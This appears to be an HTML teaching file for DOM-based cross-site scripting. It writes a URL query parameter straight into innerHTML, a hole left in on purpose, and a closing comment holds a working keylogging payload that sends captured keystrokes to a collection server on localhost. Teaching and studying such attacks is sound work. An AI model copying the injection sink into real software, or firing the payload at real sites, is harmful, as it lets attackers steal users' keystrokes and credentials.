<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>XSS Example 4</title>
  </head>
  <body>
    <div>Welcome, <span id="username"></span>!</div>

    <script>
      // Function to set a cookie, mostly this will be set for server
      function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + days * 24 * 60 * 1000);
        const expires = 'expires=' + date.toUTCString();
        document.cookie = name + '=' + value + ';' + expires + ';path=/';
      }

      // Example - Set a cookie with name "exampleCookie" with value "Hello Cookie!" that expires in 7 days
      setCookie('exampleCookie', 'Hello Cookie!', 7);
    </script>

    <!-- Vulnerable Code -->

    <script>
      // Function to set a cookie, mostly this will be set from server
      function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
        const expires = 'expires=' + date.toUTCString();
        document.cookie = name + '=' + value + ';' + expires + ';path=/';
      }
      // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
      setCookie('exampleCookie', 'Hello, Cookie!', 7);
    </script>

    <script>
      const params = new URLSearchParams(window.location.search);
      const name = params.get('name');
      document.getElementById('username').innerHTML = name;
    </script>
  </body>
</html>

<!--  ******* Example of Capturing KeyStrokes *******

<img src=\"does-not-exist\" onerror=\"var timeout; var buffer = \'\'; document.querySelector(\'body\').addEventListener(\'keypress\', function (event) { if (event.which !== 0) { clearTimeout(timeout);
buffer += String.fromCharCode(event.which); timeout = setTimeout(function () { var xhr = new XMLHttp
Request(); var uri = \'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); 
xhr.send(); buffer = \'\'; }, 400); }});\"/>

Now whatever key uses presses, these are sent to attacker as params in malicious url. All the activity is being monitored and available to attacker.
-->
